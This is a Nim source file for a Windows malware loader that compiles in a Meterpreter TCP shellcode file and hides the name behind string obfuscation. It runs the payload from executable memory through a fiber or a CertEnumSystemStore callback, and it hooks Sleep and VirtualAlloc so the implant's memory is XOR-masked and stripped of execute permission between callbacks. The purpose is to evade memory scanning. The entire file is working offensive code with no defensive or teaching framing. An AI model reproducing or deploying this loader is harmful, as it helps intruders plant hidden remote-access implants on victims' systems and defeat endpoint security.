import minhook
import ptr_math
import strformat
import winim\lean
import nimprotect


# Raw shellcode file to load
const shellcFile = protectString("x64_meterpreter_tcp")
# Shellcode execution method
#   1 = as Fiber
#   2 = CertEnumSystemStore callback
const execMethod = 2
# Implant sleep time
const sleepTime = 15 * 1000

# Global vars
var shellcAddress: LPVOID
var shellcSize: SIZE_T
var implantAllocs: seq[(PVOID, SIZE_T)]


func toBytes(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))


proc injectShellcode(shellc: seq[byte], execMethod: int): bool = 

    shellcSize = shellc.len

    # Allocate memory
    shellcAddress = VirtualAlloc(
        NULL,
        shellcSize,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    )

    when not defined(release): echo "[i] Allocated memory for shellcode at 0x" & repr shellcAddress

    # Append to implantAllocs to add protection
    implantAllocs.add((shellcAddress, shellcSize))

    when not defined(release): echo fmt"[i] Installing VirtualAlloc hook"

    # Now after allocating the shellcode we can hook VirtualAlloc
    enableHook(VirtualAlloc)

    # Copy shellcode
    CopyMemory(
        shellcAddress,
        cast[PVOID](unsafeAddr shellc[0]),
        shellcSize,
    )
    
    if execMethod == 1: # Execute as Fiber
        when not defined(release): echo "[i] Executing shellcode as Fiber"
        discard ConvertThreadToFiber(NULL)
        let shellcodeFiber = CreateFiber(shellcSize, cast[LPFIBER_START_ROUTINE](shellcAddress), NULL)
        SwitchToFiber(shellcodeFiber)

    elif execMethod == 2: # Execute as Callback
        when not defined(release): echo "[i] Executing shellcode as CertEnumSystemStore callback"
        CertEnumSystemStore(
        CERT_SYSTEM_STORE_CURRENT_USER,
        nil,
        nil,
        cast[PFN_CERT_ENUM_SYSTEM_STORE](shellcAddress)
        )
    else:
        return false


proc xorMemory(address: LPVOID, size: SIZE_T, key: byte) =
    for i in 0..<int(size):
        cast[PBYTE](address + i)[0] = cast[PBYTE](address + i)[0] xor key


proc mySleep(dwMilliseconds: DWORD) {.stdcall, minhook: Sleep.} =
    
    when not defined(release): echo "[i] Entering mySleep"
    var oldProtection : DWORD
    
    for page in implantAllocs:
        
        when not defined(release): echo fmt"[i] Changing 0x{repr page[0]} -> PAGE_READWRITE"

        # Revoke X permission
        VirtualProtect(page[0], page[1], PAGE_READWRITE, addr oldProtection)
        
        when not defined(release): echo fmt"[i] Encoding 0x{repr page[0]}"
        
        # Encode the shellcode
        xorMemory(page[0], page[1], 0x1)
        
    when not defined(release): echo fmt"[i] Sleeping for {sleepTime/1000} seconds"

    # Sleep for real
    SleepEx(sleepTime, FALSE)

    for page in implantAllocs:
        
        when not defined(release): echo fmt"[i] Decoding 0x{repr page[0]}"

        # Decode the shellcode
        xorMemory(page[0], page[1], 0x1)

        when not defined(release): echo fmt"[i] Changing 0x{repr page[0]} -> PAGE_EXECUTE_READWRITE"

        # Add X permission
        VirtualProtect(page[0], page[1], PAGE_EXECUTE_READWRITE, addr oldProtection)

        when not defined(release): echo "[i] Existing mySleep"


proc myVirtualAlloc(lpAddress: LPVOID, dwSize: SIZE_T, flAllocationType: DWORD, flProtect: DWORD): LPVOID {.stdcall, minhook: VirtualAlloc.} =
    
    # Call original
    var allocated = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
    
    # Parse requested page permissions
    var pageProt: string
    case flProtect:
        of 0x04:
            pageProt = "PAGE_READWRITE"
        of 0x20:
            pageProt = "PAGE_EXECUTE_READ"
        of 0x40:
            pageProt = "PAGE_EXECUTE_READWRITE"
        else:
            return allocated
    
    when not defined(release): echo fmt"[i] Shellcode allocated memory at 0x{repr allocated} ({pageProt})"

    # Append to implantAllocs to add protection
    implantAllocs.add((allocated, dwSize))

    return allocated




when isMainModule:
    
    # Read shellcode at compile time
    const shellcode = staticRead(shellcFile)

    when not defined(release): echo fmt"[i] Installing Sleep hook"

    # Enable kernel32:Sleep hook
    enableHook(Sleep)
    
    # Jump to shellcode
    discard injectShellcode(toBytes(shellcode), execMethod)
    
    

